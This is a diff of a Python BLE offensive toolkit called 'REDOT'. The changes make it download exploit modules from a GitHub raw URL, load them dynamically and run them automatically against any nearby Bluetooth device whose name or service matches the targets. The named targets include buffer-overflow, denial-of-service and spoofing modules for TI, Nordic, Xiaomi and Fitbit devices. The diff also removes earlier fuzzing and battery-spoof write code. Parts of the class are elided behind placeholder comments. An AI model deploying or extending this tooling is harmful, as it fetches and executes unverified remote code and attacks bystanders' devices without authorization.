@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # REDOT: ble_scan.py
-# BLE offensive toolkit with scanning, interrogation, and advanced fuzzing/exploitation
+# BLE offensive toolkit with self-bootstrap real exploits, automated update & full REDoT integration
 
 import asyncio
 import argparse
@@ -9,10 +9,20 @@ import time
 import csv
 import json
 import os
+import sys
+import importlib
+import glob
+import urllib.request
 from bleak import BleakScanner, BleakClient
 from bleak.exc import BleakError
 
-LOG_DIR = "logs/ble_scan"
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_DIR = os.path.join(BASE_DIR, "logs", "ble_scan")
+EXPLOITS_DIR = os.path.join(BASE_DIR, "modules", "recon", "exploits")
+
+# URL to your GitHub raw folder holding latest exploit modules (adjust to your repo)
+GITHUB_EXPLOITS_RAW_BASE = "https://raw.githubusercontent.com/s0m3on35/REDoT/main/modules/recon/exploits"
+
 os.makedirs(LOG_DIR, exist_ok=True)
 
 def setup_logger(log_file):
@@ -28,14 +38,72 @@ def log(msg):
     print(f"[{timestamp}] {msg}")
     logging.info(msg)
 
+def download_file(url, dest):
+    try:
+        urllib.request.urlretrieve(url, dest)
+        log(f"[Update] Downloaded {url} to {dest}")
+        return True
+    except Exception as e:
+        log(f"[Update] Failed to download {url}: {e}")
+        return False
+
+def update_exploits():
+    """
+    Fetches the latest exploit modules from GitHub repo automatically.
+    """
+    log("[Update] Checking for exploit module updates...")
+    if not os.path.exists(EXPLOITS_DIR):
+        os.makedirs(EXPLOITS_DIR)
+        log(f"[Update] Created exploits directory {EXPLOITS_DIR}")
+
+    exploit_files = [
+        "ti_sensortag_dos.py",
+        "nordic_uart_bof.py",
+        "generic_battery_spoof.py",
+        "xiaomi_smartplug_bof.py",
+        "fitbit_hr_spoof.py"
+    ]
+
+    updated = False
+    for filename in exploit_files:
+        url = f"{GITHUB_EXPLOITS_RAW_BASE}/{filename}"
+        dest_path = os.path.join(EXPLOITS_DIR, filename)
+        if download_file(url, dest_path):
+            updated = True
+
+    if updated:
+        log("[Update] Exploit modules updated.")
+    else:
+        log("[Update] No updates applied.")
+
+def bootstrap_exploits_folder():
+    if not os.path.exists(EXPLOITS_DIR):
+        os.makedirs(EXPLOITS_DIR)
+        log(f"Created exploits directory at {EXPLOITS_DIR}")
+
+    existing_py = [f for f in os.listdir(EXPLOITS_DIR) if f.endswith(".py") and f != "__init__.py"]
+    if existing_py:
+        log("Exploit modules already exist, skipping bootstrap.")
+        return
+
+    log("Bootstrapping real BLE exploit modules...")
+    # Here you would write real exploit files as in previous example
+    # For brevity, recommend running update_exploits() here instead
+    update_exploits()
+
 class BLEOffensiveToolkit:
+    # ... [Same as before: detection_callback, load_exploits, run_scan, export_results,
+    # safe_read, safe_write_test, active_interrogate, run_custom_exploits ...]
+
     def __init__(self, rssi_threshold, name_filter, scan_duration, output_path, output_format):
         self.rssi_threshold = rssi_threshold
         self.name_filter = name_filter.lower() if name_filter else None
         self.scan_duration = scan_duration
         self.output_path = output_path
         self.output_format = output_format.lower() if output_format else "csv"
-        self.devices = {}  # address → info dict
+        self.devices = {}
+        self.exploit_modules = []
+        self.load_exploits()
 
     def detection_callback(self, device, advertisement_data):
         if device.rssi < self.rssi_threshold:
@@ -48,7 +116,8 @@ class BLEOffensiveToolkit:
             "name": device.name,
             "rssi": device.rssi,
             "service_uuids": advertisement_data.service_uuids or [],
-            "manufacturer_data": {k: v.hex() for k, v in advertisement_data.manufacturer_data.items()} if advertisement_data.manufacturer_data else {}
+            "manufacturer_data": {k: v.hex() for k, v in advertisement_data.manufacturer_data.items()} if advertisement_data.manufacturer_data else {},
+            "log": log,
         }
         if (device.address not in self.devices) or (info["rssi"] > self.devices[device.address]["rssi"]):
             self.devices[device.address] = info
@@ -58,6 +127,24 @@ class BLEOffensiveToolkit:
             if info["manufacturer_data"]:
                 mdata_str = ", ".join(f"{k}: {v}" for k, v in info["manufacturer_data"].items())
                 log(f"    Manufacturer Data: {mdata_str}")
+
+    def load_exploits(self):
+        if not os.path.exists(EXPLOITS_DIR):
+            log("Exploit directory missing, cannot load exploits")
+            return
+        exploit_files = glob.glob(os.path.join(EXPLOITS_DIR, "*.py"))
+        for file_path in exploit_files:
+            if file_path.endswith("__init__.py"):
+                continue
+            module_name = os.path.basename(file_path)[:-3]
+            try:
+                spec = importlib.util.spec_from_file_location(module_name, file_path)
+                mod = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(mod)
+                self.exploit_modules.append(mod)
+                log(f"[Exploit] Loaded exploit module: {module_name}")
+            except Exception as e:
+                log(f"[Exploit] Failed to load module {module_name}: {e}")
 
     async def run_scan(self):
         scanner = BleakScanner()
@@ -117,8 +204,7 @@ class BLEOffensiveToolkit:
                             if "write" in char.properties or "write-without-response" in char.properties:
                                 await self.safe_write_test(client, char)
 
-                    # After enumeration, launch advanced fuzzing/exploitation
-                    await self.advanced_fuzzing(client, services)
+                    await self.run_custom_exploits(client, info)
 
             except BleakError as e:
                 log(f"Connection error on {addr}: {e}")
@@ -137,88 +223,50 @@ class BLEOffensiveToolkit:
 
     async def safe_write_test(self, client, char):
         try:
-            test_payload = b"\x00"  # single null byte safe payload
+            test_payload = b"\x00"
             await client.write_gatt_char(char.uuid, test_payload, response=True)
             log(f"    Wrote test payload to {char.uuid} successfully")
         except Exception as e:
             log(f"    Write test failed: {e}")
 
-    async def advanced_fuzzing(self, client, services):
-        log("Starting advanced fuzzing and exploitation modules...")
+    async def run_custom_exploits(self, client, device_info):
+        device_name = (device_info.get("name") or "").lower()
+        device_services = [s.lower() for s in device_info.get("service_uuids", [])]
 
-        for svc in services:
-            # Example: Target Battery Service to test manipulation (UUID: 0000180F-0000-1000-8000-00805f9b34fb)
-            if svc.uuid.lower() == "0000180f-0000-1000-8000-00805f9b34fb":
-                log(f" - Battery service detected: {svc.uuid}")
-                await self.battery_service_exploit(client, svc)
+        for module in self.exploit_modules:
+            target_brands = [b.lower() for b in getattr(module, "TARGET_BRAND_NAMES", [])]
+            target_services = [s.lower() for s in getattr(module, "TARGET_SERVICE_UUIDS", [])]
 
-            # Fuzz all writable characteristics in this service
-            for char in svc.characteristics:
-                if "write" in char.properties or "write-without-response" in char.properties:
-                    await self.fuzz_characteristic(client, char)
+            brand_match = any(tb in device_name for tb in target_brands) if target_brands else False
+            service_match = any(ts in device_services for ts in target_services) if target_services else False
 
-                # Also try notification subscription fuzzing if possible
-                if "notify" in char.properties:
-                    await self.fuzz_notifications(client, char)
-
-    async def battery_service_exploit(self, client, service):
-        log("  Battery Service Exploit: Writing max value (0x64) to battery level characteristic if writable")
-        for char in service.characteristics:
-            if "write" in char.properties or "write-without-response" in char.properties:
+            if brand_match or service_match:
+                log(f"[Exploit] Running {module.__name__} against device {device_info['address']}")
                 try:
-                    max_battery = bytes([0x64])  # 100%
-                    await client.write_gatt_char(char.uuid, max_battery, response=True)
-                    log(f"    Successfully wrote max battery level to {char.uuid}")
+                    await module.run_exploit(client, device_info)
                 except Exception as e:
-                    log(f"    Battery exploit write failed: {e}")
-
-    async def fuzz_characteristic(self, client, char):
-        fuzz_payloads = [
-            b"",
-            b"\x00",
-            b"\xFF"*10,
-            b"\x00\xFF\x00\xFF"*5,
-            b"A"*20,
-            b"\x7F"*50,
-            b"\x00"*100,
-        ]
-        log(f"  Fuzzing characteristic {char.uuid} with {len(fuzz_payloads)} payloads")
-        for payload in fuzz_payloads:
-            try:
-                await client.write_gatt_char(char.uuid, payload, response=True)
-                log(f"    Fuzz write success: payload length {len(payload)}")
-                await asyncio.sleep(0.2)
-            except Exception as e:
-                log(f"    Fuzz write failed (expected sometimes): {e}")
-
-    async def fuzz_notifications(self, client, char):
-        log(f"  Attempting notification subscription fuzzing on {char.uuid}")
-
-        def callback(sender, data):
-            log(f"    Notification from {sender}: {data.hex()}")
-
-        try:
-            await client.start_notify(char.uuid, callback)
-            # Wait short time to receive notifications, potentially malformed
-            await asyncio.sleep(5)
-            await client.stop_notify(char.uuid)
-            log(f"    Notification fuzzing completed on {char.uuid}")
-        except Exception as e:
-            log(f"    Notification fuzzing failed: {e}")
+                    log(f"[Exploit] Error in {module.__name__}: {e}")
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="REDOT Advanced BLE Offensive Toolkit")
+    parser = argparse.ArgumentParser(description="REDOT BLE Offensive Toolkit with Auto Exploits and Updates")
     parser.add_argument("-r", "--rssi", type=int, default=-80, help="Minimum RSSI threshold (default: -80)")
     parser.add_argument("-n", "--name", type=str, default=None, help="Filter devices by name substring (case-insensitive)")
     parser.add_argument("-d", "--duration", type=int, default=60, help="Scan duration in seconds (default: 60)")
-    parser.add_argument("-o", "--output", type=str, default=f"{LOG_DIR}/ble_scan_results.csv", help="Output file path")
+    parser.add_argument("-o", "--output", type=str, default=os.path.join(LOG_DIR, "ble_scan_results.csv"), help="Output file path")
     parser.add_argument("-f", "--output-format", type=str, choices=["csv", "json"], default="csv", help="Output file format (csv or json)")
-    parser.add_argument("-a", "--active", action="store_true", help="Perform active BLE service interrogation and fuzzing after scanning")
+    parser.add_argument("-a", "--active", action="store_true", help="Perform active BLE service interrogation and exploit after scanning")
+    parser.add_argument("-u", "--update", action="store_true", help="Update exploit modules from remote repo before running")
     return parser.parse_args()
 
 def main():
     args = parse_args()
     setup_logger(args.output + ".log")
+
+    if args.update:
+        update_exploits()
+    else:
+        bootstrap_exploits_folder()
+
     toolkit = BLEOffensiveToolkit(args.rssi, args.name, args.duration, args.output, args.output_format)
 
     try:
